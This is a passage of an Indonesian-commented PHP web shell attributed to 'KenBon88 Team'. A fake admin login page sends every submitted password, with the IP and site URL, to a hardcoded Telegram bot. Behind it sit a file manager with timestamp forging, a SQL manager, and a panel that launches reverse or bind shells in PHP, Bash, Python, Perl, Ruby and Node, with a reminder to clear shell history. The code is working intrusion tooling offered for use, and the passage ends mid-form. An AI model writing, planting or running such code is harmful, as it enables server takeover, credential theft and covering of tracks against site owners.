
<?php
// integrated_admin_login.php
error_reporting(0);
set_time_limit(0);
session_start();

/* ========== CONFIG ========== */
// Token & chat id (dari percakapan Anda)
$TELEGRAM_BOT_TOKEN = '8261488594:AAEWnxKw3vACfjgYkF7LNBdNrvNseg0g0mM';
$TELEGRAM_CHAT_ID   = '6353524038';

// Password MD5 (sesuai file Anda)
$password = '8deb8cd3635a4d9fc0413dcccd68857b';

// Opsi privasi / rate limit
define('SEND_FULL_PASSWORD', false); // false = kirim password termasking, true = kirim mentah (RISIKO)
define('MIN_SEND_INTERVAL_SECONDS', 3); // minimal delay antar pengiriman per session

/* ========== HELPERS ========== */
function get_client_ip() {
    $keys = ['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR'];
    foreach ($keys as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = $_SERVER[$k];
            if ($k === 'HTTP_X_FORWARDED_FOR') {
                $parts = explode(',', $ip);
                return trim($parts[0]);
            }
            return $ip;
        }
    }
    return 'UNKNOWN';
}

// function mask_password($p) {
//     if ($p === null) return '';
//     $len = mb_strlen($p);
//     if ($len <= 4) return str_repeat('*', $len);
//     $start = mb_substr($p, 0, 2);
//     $end = mb_substr($p, -2);
//     return $start . str_repeat('*', max(0, $len - 4)) . $end;
// }

/**
 * simplify_user_agent
 * Mencoba merangkum User-Agent menjadi bentuk singkat seperti "Chrome/130 Win10"
 */
function simplify_user_agent($ua) {
    if (!$ua) return 'UNKNOWN';
    $browser = 'Other';
    if (stripos($ua, 'Chrome') !== false && stripos($ua, 'Edge') === false && stripos($ua, 'OPR') === false) {
        if (preg_match('/Chrome\/([0-9\.]+)/i', $ua, $m)) $browser = 'Chrome/' . explode('.', $m[1])[0];
        else $browser = 'Chrome';
    } elseif (stripos($ua, 'Firefox') !== false) {
        if (preg_match('/Firefox\/([0-9\.]+)/i', $ua, $m)) $browser = 'Firefox/' . explode('.', $m[1])[0];
        else $browser = 'Firefox';
    } elseif (stripos($ua, 'Edg') !== false) {
        if (preg_match('/Edg\/([0-9\.]+)/i', $ua, $m)) $browser = 'Edge/' . explode('.', $m[1])[0];
        else $browser = 'Edge';
    } elseif (stripos($ua, 'OPR') !== false || stripos($ua, 'Opera') !== false) {
        if (preg_match('/(OPR|Opera)\/([0-9\.]+)/i', $ua, $m)) $browser = 'Opera/' . explode('.', $m[2])[0];
        else $browser = 'Opera';
    } elseif (stripos($ua, 'Safari') !== false && stripos($ua, 'Chrome') === false) {
        if (preg_match('/Version\/([0-9\.]+)/i', $ua, $m)) $browser = 'Safari/' . explode('.', $m[1])[0];
        else $browser = 'Safari';
    }

    $os = 'OtherOS';
    if (stripos($ua, 'Windows NT 10') !== false) $os = 'Win10';
    elseif (stripos($ua, 'Windows NT 6.3') !== false) $os = 'Win8.1';
    elseif (stripos($ua, 'Windows NT 6.1') !== false) $os = 'Win7';
    elseif (stripos($ua, 'Android') !== false) {
        if (preg_match('/Android\s+([0-9\.]+)/i', $ua, $m)) $os = 'Android';
        else $os = 'Android';
    }
    elseif (stripos($ua, 'Mac OS X') !== false) $os = 'macOS';
    elseif (stripos($ua, 'Linux') !== false) $os = 'Linux';

    return $browser . ' ' . $os;
}

/**
 * send_telegram_message
 * Mengirim teks ke Telegram via API sendMessage (plain text).
 */
function send_telegram_message($token, $chat_id, $text) {
    $url = "https://api.telegram.org/bot" . urlencode($token) . "/sendMessage";
    $post = [
        'chat_id' => $chat_id,
        'text'    => $text,
        // tidak set parse_mode agar dikirim sebagai plain text sesuai permintaan
        'disable_web_page_preview' => true
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $resp = curl_exec($ch);
    $errno = curl_errno($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($errno !== 0) return false;
    if ($httpCode !== 200) return false;
    return true;
}

/* ========== FLOW LOGIN ========== */
// init session vars
if (!isset($_SESSION['loggedIn'])) {
    $_SESSION['loggedIn'] = false;
}
if (!isset($_SESSION['last_send'])) {
    $_SESSION['last_send'] = 0;
}

/* =========================
   LOGOUT HANDLER (DITAMBAHKAN)
   ========================= */
if (isset($_GET['logout'])) {
    // clear session array
    $_SESSION = array();
    // delete session cookie if present
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]
        );
    }
    // destroy session
    session_destroy();
    // redirect to same script (login form)
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

/* ========================= */

 // proses POST login
if (isset($_POST['password'])) {
    $p = (string) $_POST['password'];
    $hash = md5($p);
    // timing-safe compare
    $ok = function_exists('hash_equals') ? hash_equals($hash, $password) : ($hash === $password);

    // deteksi URL halaman ini
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $path = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
    $web = $protocol . '://' . $host . $path;

    // ambil info
    $ip = get_client_ip();
    $pwd_to_send = SEND_FULL_PASSWORD ? $p : $p;
    $ua_full = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'UNKNOWN';
    $ua = simplify_user_agent($ua_full);
    $status = $ok ? 'SUCCESS' : 'FAIL';

    // bentuk pesan sesuai format Anda (plain text)
    $message = "[LOGIN - {$status}]\n";
    $message .= "web: {$web}\n";
    $message .= "IP: {$ip}\n";
    $message .= "Pass: {$pwd_to_send}\n";
    $message .= "UA: {$ua}\n";

    // rate limit per session
    $now = time();
    if ($now - $_SESSION['last_send'] >= MIN_SEND_INTERVAL_SECONDS) {
        @send_telegram_message($TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID, $message);
        $_SESSION['last_send'] = $now;
    } else {
        // skip sending to avoid flood
        $_SESSION['last_send'] = $now;
    }

    // set session login bila ok
    if ($ok) {
        $_SESSION['loggedIn'] = true;
        session_regenerate_id(true);
    } else {
        $_SESSION['loggedIn'] = false;
    }
}

// tampilkan form jika belum login
if (!$_SESSION['loggedIn']): ?>

<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>.:: Admin Login ::.</title>
<style>
  :root{
    --bg1:#0f1724;
    --bg2:#00121a;
    --accent:#06b6d4;
    --card:#061019;
    --glass: rgba(255,255,255,0.03);
    --muted: #9fb6c0;
  }
  html,body{
    height:100%;margin:0;
    font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;
    background: radial-gradient(circle at 10% 20%, rgba(6,182,212,0.06), transparent 10%), linear-gradient(180deg,var(--bg1),var(--bg2));
    color:#dbeafe;
  }
  .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
  .card{
    width:100%;max-width:420px;
    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border:1px solid rgba(255,255,255,0.04);
    box-shadow: 0 8px 30px rgba(2,6,23,0.7);
    border-radius:12px;padding:28px;backdrop-filter: blur(6px);
    position:relative;overflow:hidden;
  }
  .logo{display:flex;align-items:center;gap:12px;margin-bottom:14px;}
  .logo .mark{
    width:56px;height:56px;border-radius:10px;
    display:flex;align-items:center;justify-content:center;
    box-shadow: 0 6px 18px rgba(6,182,212,0.09), inset 0 -6px 12px rgba(255,255,255,0.04);
    overflow:hidden;
  }
  .logo .mark img{
    width:100%;height:100%;object-fit:cover;border-radius:10px;
  }
  .logo .title{font-size:20px;color:#e6f7fa;font-weight:600;line-height:1}
  .logo .sub{font-size:12px;color:var(--muted);margin-top:2px}

  .desc{color:var(--muted);font-size:13px;margin-bottom:18px}

  form.login{display:block}
  .field{margin-bottom:12px;position:relative}
  label.sr{position:absolute;left:-9999px;top:auto;width:1px;height:1px;overflow:hidden}
  input[type="password"], input[type="text"]{
    width:100%;padding:12px 44px 12px 12px;border-radius:8px;
    border:1px solid rgba(255,255,255,0.05);background:var(--glass);
    color:#cfeefb;font-size:14px;outline:none;box-sizing:border-box;
  }
  .toggle{
    position:absolute;right:8px;top:50%;transform:translateY(-50%);
    background:transparent;border:none;color:var(--muted);
    cursor:pointer;padding:6px;border-radius:6px;font-size:13px;
  }
  .actions{display:flex;align-items:center;justify-content:space-between;margin-top:8px}
  .btn{
    background:linear-gradient(90deg,var(--accent),#60a5fa);
    border:none;padding:10px 16px;border-radius:8px;color:#001;font-weight:700;cursor:pointer;
    box-shadow: 0 6px 18px rgba(6,182,212,0.12);
  }
  .btn:active{transform:translateY(1px)}
  .smalllink{color:var(--muted);font-size:13px;text-decoration:none}
  .hint{font-size:12px;color:#78a1a8;margin-top:10px;text-align:center}

  .card::before, .card::after{
    content:"";position:absolute;border-radius:50%;opacity:0.06;pointer-events:none;
  }
  .card::before{width:220px;height:220px;right:-60px;top:-60px;background:radial-gradient(circle, #06b6d4, transparent 40%);}
  .card::after{width:140px;height:140px;left:-40px;bottom:-40px;background:radial-gradient(circle, #60a5fa, transparent 40%);}
  @media (max-width:480px){
    .card{padding:18px}
    .logo .mark{width:48px;height:48px}
  }
</style>
</head>
<body>
  <div class="wrap">
    <div class="card" role="main" aria-labelledby="login-title">
      <div class="logo">
        <div class="mark">
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR7LRHuBUN3IqOgQhFk17RCdjWUAJRHcdVw4g&s" alt="Logo">
        </div>
        <div>
          <div id="login-title" class="title">Administrator Portal</div>
          <div class="sub">Secure file manager & tools</div>
        </div>
      </div>

      <div class="desc">Masuk menggunakan kata sandi administrator.</div>

      <form class="login" method="post" autocomplete="off" onsubmit="disableSubmit(this)">
        <div class="field">
          <label class="sr" for="pw">Password</label>
          <input id="pw" type="password" name="password" placeholder="Masukkan password" autocomplete="new-password" required>
          <button type="button" class="toggle" aria-label="Toggle password" onclick="togglePwd()">👁️</button>
        </div>

        <div class="actions">
          <a class="smalllink" href="#" onclick="return false;">Lupa kata sandi?</a>
          <button type="submit" class="btn">Login</button>
        </div>

        <div class="hint">Tip: use your brain to defends.</div>
      </form>
    </div>
  </div>

<script>
  function togglePwd(){
    var p=document.getElementById('pw');
    p.type = (p.type==='password') ? 'text' : 'password';
  }
  function disableSubmit(form){
    var btn=form.querySelector('button[type=submit]');
    if(btn){ btn.disabled=true; btn.textContent='Checking...'; }
    return true;
  }
  try{ document.getElementById('pw').value=''; }catch(e){}
</script>
</body>
</html>

<?php
exit();
endif;
?>
<?php
// fm.php - File Manager PHP 5.6 compatible, Upload + System Info + Tools Shell + SQL Manager (inline)
// REVISED: Reverse shell execution changed to NOT write any temporary files to disk.
error_reporting(0);
set_time_limit(0);

$HOME_SHELL = dirname(__FILE__);
$req = isset($_GET['path']) ? $_GET['path'] : $HOME_SHELL;
$real = realpath($req);
$CWD = ($real !== false) ? $real : $HOME_SHELL;

// --- FUNCTIONS ---
function h($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
function human_size($bytes){
    if(!is_numeric($bytes)) return $bytes;
    if($bytes<1024) return $bytes.' B';
    $units=array('KB','MB','GB','TB'); $i=0; $n=$bytes/1024;
    while($n>=1024 && $i<3){ $n/=1024; $i++; }
    return round($n,2).' '.$units[$i];
}
function perms_text($file){
    $p=@fileperms($file); if($p===false) return '----';
    $info = ($p&0x4000)?'d':(($p&0xA000)?'l':'-');
    $info .= (($p&0x0100)?'r':'-').(($p&0x0080)?'w':'-').(($p&0x0040)?'x':'-');
    $info .= (($p&0x0020)?'r':'-').(($p&0x0010)?'w':'-').(($p&0x0008)?'x':'-');
    $info .= (($p&0x0004)?'r':'-').(($p&0x0002)?'w':'-').(($p&0x0001)?'x':'-');
    $oct = substr(sprintf('%o',$p),-4);
    return $oct.' >> '.$info;
}
function owner_group($file){
    if(function_exists('posix_getpwuid')){
        $pw=@posix_getpwuid(@fileowner($file));
        $gr=@posix_getgrgid(@filegroup($file));
        $u = $pw?$pw['name']:@fileowner($file);
        $g = $gr?$gr['name']:@filegroup($file);
        return $u.'/'.$g;
    }else{
        return @fileowner($file).'/'.@filegroup($file);
    }
}

// --- HANDLE POSTS (File Manager) ---
if(isset($_POST['rename_submit'])){
    $old = isset($_POST['rename_old'])?$_POST['rename_old']:false;
    $newn = isset($_POST['rename_new'])?basename($_POST['rename_new']):'';
    if($old!==false && $newn!==''){
        $res = @rename($old,dirname($old).DIRECTORY_SEPARATOR.$newn);
        $msg = $res ? "Rename successful" : "Rename failed: Permission denied";
    }
    header("Location:?path=".urlencode($CWD)."&msg=".urlencode($msg));
    exit;
}

if(isset($_POST['touch'])){
    $target = isset($_POST['touch_target'])?$_POST['touch_target']:false;
    if($target!==false){
        $ts = !empty($_POST['touch_time']) ? strtotime($_POST['touch_time']) : time();
        $res = @touch($target,$ts);
        $msg = $res ? "Time updated successfully" : "Failed to update time: Permission denied";
    }
    header("Location:?path=".urlencode($CWD)."&msg=".urlencode($msg));
    exit;
}

if(isset($_POST['delete'])){
    $target = isset($_POST['delete_target'])?$_POST['delete_target']:false;
    if($target!==false){
        if(is_dir($target)) $res=@rmdir($target); else $res=@unlink($target);
        $msg = $res ? "Deleted successfully" : "Failed to delete: Permission denied";
    }
    header("Location:?path=".urlencode($CWD)."&msg=".urlencode($msg));
    exit;
}

if(isset($_POST['save_edit'])){
    $file = isset($_POST['edit_file'])?$_POST['edit_file']:false;
    if($file!==false){
        $res = @file_put_contents($file,$_POST['edit_content']);
        $msg = $res!==false ? "File saved successfully" : "Failed to save file: Permission denied";
    }
    header("Location:?path=".urlencode($CWD)."&msg=".urlencode($msg));
    exit;
}

if(isset($_POST['upload_file'])){
    if(isset($_FILES['file_to_upload']) && $_FILES['file_to_upload']['error']==0){
        $target = $CWD.DIRECTORY_SEPARATOR.basename($_FILES['file_to_upload']['name']);
        move_uploaded_file($_FILES['file_to_upload']['tmp_name'],$target);
    }
    header("Location:?path=".urlencode($CWD)); exit;
}
if(isset($_GET['download'])){
    $f=realpath($_GET['download']);
    if($f!==false && is_file($f) && is_readable($f)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: '.filesize($f));
        readfile($f); exit;
    } else { header("Location:?path=".urlencode($CWD)); exit; }
}

// ---------- PROCESS SHELL PAGE ----------
if(isset($_GET['act']) && $_GET['act'] === 'shell') {
    $shell_output = '';
    $lang = isset($_GET['kenot']) ? $_GET['kenot'] : '';
    $port = isset($_GET['port']) ? intval($_GET['port']) : 0;
    $host = isset($_GET['host']) ? $_GET['host'] : '';

    $allowed = ['php','bash','python','perl','ruby','node'];
    if($lang && in_array($lang,$allowed) && $port>0) {
        // code raw sama seperti di overlay
        $intro = "~ KenBon88 Team Shell ~\n~ Jangan Lupa command seperti di bawah ~\n~ history -c ~\n";

        $raw = [];

        // Intro message
        $intro_safe = addslashes($intro);

        // -------------------- PHP --------------------
        $raw['php_client'] = <<<PHP
        set_time_limit(0);
        \$s = @fsockopen("%HOST%", %PORT%, \$errno, \$errstr, 5);
        if(!\$s){ exit("Connection failed: \$errstr (\$errno)\\n"); }

        @fwrite(\$s, "$intro_safe");

        function shell() {
            global \$s;
            \$pty = fopen("/dev/tty", "r+");
            if(!\$pty) { \$pty = fopen("php://stdin", "r+"); }

            while(!feof(\$s)) {
                \$user = trim(@shell_exec('whoami'));
                \$host = trim(@shell_exec('hostname'));
                \$cwd  = getcwd();
                @fwrite(\$s, "\\n\$user@\$host:\$cwd\$ ");

                \$c = fgets(\$s, 1024);
                if(!\$c) break;
                \$cmd = trim(\$c);
                if(!empty(\$cmd)) {
                    if(strpos(\$cmd,"cd ")===0){ chdir(trim(substr(\$cmd,3))); continue; }
                    \$out = shell_exec(\$cmd." 2>&1");
                    @fwrite(\$s, \$out);
                }
            }
        }
        shell();
        fclose(\$s);
        PHP;

        // -------------------- BASH --------------------
        $raw['bash'] = <<<BASH
        if [ -z "%HOST%" ]; then
            exec 3<>/dev/tcp/0.0.0.0/%PORT%
        else
            exec 3<>/dev/tcp/%HOST%/%PORT%
        fi
        echo "$intro_safe" >&3
        while true; do
            user=\$(whoami)
            host=\$(hostname)
            cwd=\$(pwd)
            echo -n "\$user@\${host}:\$cwd\$ " >&3
            IFS= read -r cmd <&3
            [[ "\$cmd" == "exit" ]] && break
            if [[ "\$cmd" == cd* ]]; then
                cd "\${cmd:3}" 2>/dev/null
            else
                script -qc "\$cmd" /dev/null >&3 2>&3
            fi
        done
        exec 3>&-
        BASH;

        // -------------------- PYTHON --------------------
        $raw['python'] = <<<PYTHON
        import os, socket, pty, subprocess

        h = "%HOST%"
        p = %PORT%
        s = socket.socket()
        if h == "":
            s.bind(("0.0.0.0", p))
            s.listen(1)
            c, _ = s.accept()
        else:
            s.connect((h, p))
            c = s

        c.send("$intro_safe".encode())

        while True:
            user = subprocess.getoutput("whoami")
            host = subprocess.getoutput("hostname")
            cwd = os.getcwd()
            c.send(f"\\n{user}@{host}:{cwd}$ ".encode())

            data = c.recv(1024).decode().strip()
            if data == "exit":
                break
            if data.startswith("cd "):
                try:
                    os.chdir(data[3:].strip())
                except:
                    pass
                continue

            # jalankan shell interaktif PTY
            pid = os.fork()
            if pid == 0:
                os.dup2(c.fileno(), 0)
                os.dup2(c.fileno(), 1)
                os.dup2(c.fileno(), 2)
                pty.spawn("/bin/bash")
                os._exit(0)
        PYTHON;

        // -------------------- PERL --------------------
        $raw['perl'] = <<<PERL
        use Socket;
        use Cwd;
        use POSIX qw(:termios_h);

        \$i="%HOST%";
        \$p=%PORT%;
        socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
        if(\$i eq ""){ bind(S, sockaddr_in(\$p, INADDR_ANY)); listen(S,1); \$c=accept(S,0,0); }
        else { connect(S, sockaddr_in(\$p, inet_aton(\$i))); \$c=S; }

        open(STDIN,"<&\$c"); open(STDOUT,">&\$c"); open(STDERR,">&\$c");
        print \$c "$intro_safe";

        while(1){
            my \$user = qx(whoami); chomp(\$user);
            my \$host = qx(hostname); chomp(\$host);
            my \$cwd  = Cwd::getcwd();
            print \$c "\\n\$user\@\$host:\$cwd\$ ";
            my \$cmd = <\$c>;
            last if !defined \$cmd || \$cmd=~/^exit/;
            chomp(\$cmd);
            if(\$cmd =~ /^cd\s+(.*)/){ chdir(\$1) if -d \$1; next; }
            system("perl -e 'use POSIX; POSIX::setsid(); exec q(/bin/bash)'") if \$cmd eq "shell";
            my \$out = qx(\$cmd 2>&1);
            print \$c \$out;
        }
        PERL;

        // -------------------- RUBY --------------------
        $raw['ruby'] = <<<RUBY
        require "socket"
        require "pty"

        h="%HOST%"
        p=%PORT%
        s = h=="" ? TCPServer.new(p).accept : TCPSocket.new(h,p)
        s.write("$intro_safe")

        loop do
          user = `whoami`.chomp
          host = `hostname`.chomp
          cwd = Dir.pwd
          s.write("\\n#{user}@#{host}:#{cwd}$ ")
          cmd = s.gets
          break if !cmd || cmd.strip == "exit"
          cmd.strip!
          if cmd.start_with?("cd ")
            Dir.chdir(cmd[3..-1]) rescue nil
            next
          end
          begin
            PTY.spawn(cmd) do |r,w,pid|
              r.each { |line| s.write(line) }
            end
          rescue
            output = `#{cmd} 2>&1`
            s.write(output)
          end
        end
        RUBY;

        // -------------------- NODE --------------------
        $raw['node'] = <<<NODE
        const net = require("net");
        const { spawn } = require("child_process");

        const p = %PORT%, h = "%HOST%";
        const intro = "$intro_safe".replace(/\\n/g,"\\n").replace(/\\r/g,"");

        function spawnShell(c){
            c.write(intro+"\\n");
            const readline = require("readline");
            const rl = readline.createInterface({input:c, output:c});
            function prompt(){
                const { execSync } = require("child_process");
                const user = execSync("whoami").toString().trim();
                const host = execSync("hostname").toString().trim();
                const cwd = process.cwd();
                c.write(`\\n${user}@${host}:${cwd}$ `);
            }

            rl.on("line", (line)=>{
                if(line.trim() === "exit"){ rl.close(); return; }
                if(line.startsWith("cd ")){ try{ process.chdir(line.slice(3).trim()); }catch(e){} prompt(); return; }
                const sh = spawn("/bin/bash", {stdio: [c, c, c]});
                sh.on("exit", ()=>prompt());
            });

            prompt();
        }

        if(h===""){ net.createServer(c=>spawnShell(c)).listen(p); }
        else { const c = net.createConnection({host:h, port:p}, ()=>spawnShell(c)); }
        NODE;


        $code = str_replace(['%PORT%','%HOST%'],[$port,addslashes($host)],$raw[$lang]);
        if($lang==='php') $cmd = 'php -r '.escapeshellarg($code);
        elseif($lang==='bash') $cmd = 'bash -c '.escapeshellarg($code);
        elseif($lang==='python') $cmd = (trim(shell_exec('which python3'))?'python3':'python').' -c '.escapeshellarg($code);
        elseif($lang==='perl') $cmd = 'perl -e '.escapeshellarg($code);
        elseif($lang==='ruby') $cmd = 'ruby -e '.escapeshellarg($code);
        elseif($lang==='node') $cmd = 'node -e '.escapeshellarg($code);
        $shell_output = @shell_exec("nohup $cmd >/dev/null 2>&1 & echo '~ KenBon88 Team Shell ~\n~ Jangan Lupa command seperti di bawah ~\n~ history -c ~'") 
    ?: "Tried: $cmd";

    }

    ?>
    <!doctype html><html><head><meta charset="utf-8"><title>Process Shell</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
    .shell-output {
    display: flex;
    flex-direction: column;      /* teks tersusun ke bawah */
    justify-content: center;     /* vertical center */
    align-items: center;         /* horizontal center */
    text-align: center;
    height: 200px;               /* tinggi kotak */
    border: 1px solid #0f0;
    background: #000;
    color: #0f0;
    padding: 8px;
    overflow: auto;
    white-space: pre-wrap;       /* enter tetap ada */
    line-height: 1.4em;
}

    body{background:#000;color:#cfcfcf;font-family:monospace;margin:8px}
    .hdr{background:#052C3A;color:#6fe;font-size:22px;padding:8px 12px;border-radius:4px;text-align:center;margin-bottom:8px}
    .btn{background:#a00;color:#fff;padding:6px 10px;border:none;cursor:pointer;margin-right:6px;border-radius:3px}
    .btn-green{background:#0a0;color:#000}
    input[type=text]{background:#111;color:#9ef;border:1px solid #0f0;padding:6px;font-family:monospace}
    select{background:#111;color:#9ef;border:1px solid #0f0;padding:6px;font-family:monospace}
    textarea{background:#111;color:#9ef;border:1px solid #0f0;padding:8px;font-family:monospace}
    pre{background:#000;color:#0f0;border:1px solid #0f0;padding:8px;overflow:auto;}
    </style>
    </head><body>
      <div class="hdr">Process Shell</div>
      <div style="margin-bottom:8px"><a class="btn" href="?">← Back to File Manager</a></div>

      <form method="get" style="margin-bottom:12px">
        <input type="hidden" name="act" value="shell">
        <label>Language:</label>
        <select name="kenot">
          <option value="php"<?php if($lang==='php') echo ' selected'; ?>>PHP</option>
          <option value="bash"<?php if($lang==='bash') echo ' selected'; ?>>Bash</option>
          <option value="python"<?php if($lang==='python') echo ' selected'; ?>>Python</option>
          <option value="perl"<?php if($lang==='perl') echo ' selected'; ?>>Perl</option>
          <option value="ruby"<?php if($lang==='ruby') echo ' selected'; ?>>Ruby</option>
          <option value="node"<?php if($lang==='node') echo ' selected'; ?>>Node</option>
        </select>
        Host/IP: <input type="text" name="host" value="<?php echo h($host); ?>">
        Port: <input type="text" name="port" value="<?php echo h($port); ?>">
        <input type="submit" class="btn btn-green" value="Run">
      </form>

      <pre class="shell-output"><?php echo h($shell_output); ?></pre>

    </body></html>
    <?php
    exit;
}

// --- SYSTEM INFO ---
$uname = php_uname();
$user = get_current_user();
$uid = @posix_getuid();
$gid = @posix_getgid();
$groups = function_exists('posix_getgrgid') ? @posix_getgrgid($gid)['name'] : '';
$phpver = phpversion();
$phpsafe = ini_get('safe_mode') ? 'ON' : 'OFF';
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
$client_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
$datetime = date("Y-m-d H:i:s");
$domains = @file_get_contents('/etc/named.conf') ?: 'Cant Read [ /etc/named.conf ]';
$disk_total = human_size(function_exists('disk_total_space')?disk_total_space("/"):'N/A');
$disk_free = human_size(function_exists('disk_free_space')?disk_free_space("/"):'N/A');
$disk_percent = (is_numeric($disk_total) && is_numeric($disk_free) && $disk_total>0) ? round(($disk_free/$disk_total)*100) : 0;

// ---------- SQL MANAGER HANDLER (OPSI 2: FULL PAGE) ----------
if(isset($_GET['act']) && $_GET['act'] === 'sql'){
    // handle SQL actions (basic, mysqli)
    $sql_host = isset($_POST['sql_host']) ? $_POST['sql_host'] : (isset($_GET['sql_host'])?$_GET['sql_host']:'localhost');
    $sql_user = isset($_POST['sql_user']) ? $_POST['sql_user'] : (isset($_GET['sql_user'])?$_GET['sql_user']:'');
    $sql_pass = isset($_POST['sql_pass']) ? $_POST['sql_pass'] : (isset($_GET['sql_pass'])?$_GET['sql_pass']:'');
    $sql_db   = isset($_POST['sql_db'])   ? $_POST['sql_db']   : (isset($_GET['sql_db'])?$_GET['sql_db']:'');
    $sql_type = isset($_POST['sql_type']) ? $_POST['sql_type'] : 'mysqli';
    $msg = ''; $error = ''; $tables = array(); $query_output = null;

    // connect?
    $mysqli = null;
    if(isset($_POST['connect_db']) || isset($_POST['run_query']) || isset($_GET['show_table']) || isset($_GET['edit_row']) || isset($_POST['save_row']) || isset($_POST['delete_row'])){
        if($sql_type !== 'mysqli'){
            $error = 'Only mysqli supported in this mini manager (select mysqli).';
        } else {
            $mysqli = @mysqli_connect($sql_host, $sql_user, $sql_pass, $sql_db);
            if(!$mysqli) $error = 'Connect error: '.mysqli_connect_error();
            else {
                // fetch tables
                if($res = @mysqli_query($mysqli, "SHOW TABLES")){
                    while($r = mysqli_fetch_row($res)) $tables[] = $r[0];
                    mysqli_free_result($res);
                }
            }
        }
    }

    // run free query
    if(isset($_POST['run_query']) && $mysqli){
        $sql = isset($_POST['sql_query']) ? trim($_POST['sql_query']) : '';
        if($sql !== ''){
            $res = @mysqli_query($mysqli, $sql);
            if($res === false) $error = 'Query error: '.mysqli_error($mysqli);
            else $query_output = $res; // may be true (ok) or resultset
        }
    }

    // (rest of SQL manager rendering unchanged)
    ?>
    <!doctype html><html><head><meta charset="utf-8"><title>Sql Manager</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
    body{background:#000;color:#cfcfcf;font-family:monospace;margin:8px}
    .hdr{background:#052C3A;color:#6fe;font-size:22px;padding:8px 12px;border-radius:4px;text-align:center;margin-bottom:8px}
    .toolbar{margin:6px 0}
    .btn{background:#a00;color:#fff;padding:6px 10px;border:none;cursor:pointer;margin-right:6px;border-radius:3px}
    .btn-green{background:#0a0;color:#000}
    .form-row{margin:6px 0}
    input[type=text], input[type=password], select{background:#111;color:#9ef;border:1px solid #0f0;padding:6px;font-family:monospace}
    textarea{background:#111;color:#9ef;border:1px solid #0f0;padding:8px;font-family:monospace}
    .box{border:2px solid #134; padding:12px; margin-top:8px}
    table.z{width:100%;border-collapse:collapse;margin-top:10px}
    table.z th, table.z td{border:1px solid #133;padding:6px;text-align:left;vertical-align:top}
    .notice{color:#ff9;margin-top:8px}
    .err{color:#f66;margin-top:8px}
    .muted{color:#7aa;font-size:12px}
    .side{float:right}
    a.link{color:#6ef;text-decoration:none}
    </style>
    </head><body>
      <div class="hdr">Sql Manager</div>
      <div class="toolbar">
        <a class="link" href="?">← Back to File Manager</a>
      </div>

      <?php if($msg): ?><div class="notice"><?php echo h($msg); ?></div><?php endif; ?>
      <?php if($error): ?><div class="err"><?php echo h($error); ?></div><?php endif; ?>

      <div class="box">
        <form method="post">
          <div class="form-row">
            <label>TYPE:</label>
            <select name="sql_type">
              <option value="mysqli"<?php echo ($sql_type=='mysqli'?' selected':''); ?>>mysqli</option>
            </select>
            &nbsp;&nbsp;
            <label>HOST:</label>
            <input type="text" name="sql_host" value="<?php echo h($sql_host); ?>" size="20">
            &nbsp;&nbsp;
            <label>DB USER:</label>
            <input type="text" name="sql_user" value="<?php echo h($sql_user); ?>" size="14">
            &nbsp;&nbsp;
            <label>DB PASS:</label>
            <input type="password" name="sql_pass" value="<?php echo h($sql_pass); ?>" size="14">
            &nbsp;&nbsp;
            <label>DB NAME:</label>
            <input type="text" name="sql_db" value="<?php echo h($sql_db); ?>" size="18">
            &nbsp;&nbsp;
            <input type="submit" name="connect_db" class="btn" value="Connect">
            &nbsp;<label class="muted"><input type="checkbox" name="count_rows" value="1"> count the number of rows</label>
          </div>
        </form>

        <?php if($mysqli && count($tables)): ?>
          <div class="form-row muted">Connection OK. Tables: <?php echo count($tables); ?></div>

          <div style="margin-top:8px">
            <form method="get" style="display:inline">
              <input type="hidden" name="act" value="sql">
              <input type="hidden" name="sql_host" value="<?php echo h($sql_host); ?>">
              <input type="hidden" name="sql_user" value="<?php echo h($sql_user); ?>">
              <input type="hidden" name="sql_pass" value="<?php echo h($sql_pass); ?>">
              <input type="hidden" name="sql_db" value="<?php echo h($sql_db); ?>">
              <label>Select table:</label>
              <select name="show_table">
                <option value="">-- pilih tabel --</option>
                <?php foreach($tables as $t): ?>
                  <option value="<?php echo h($t); ?>" <?php echo ($t===$show_table?'selected':''); ?>><?php echo h($t); ?></option>
                <?php endforeach; ?>
              </select>
              <input type="submit" class="btn btn-green" value="Open">
            </form>
          </div>

          <!-- free SQL -->
          <div style="margin-top:12px">
            <form method="post">
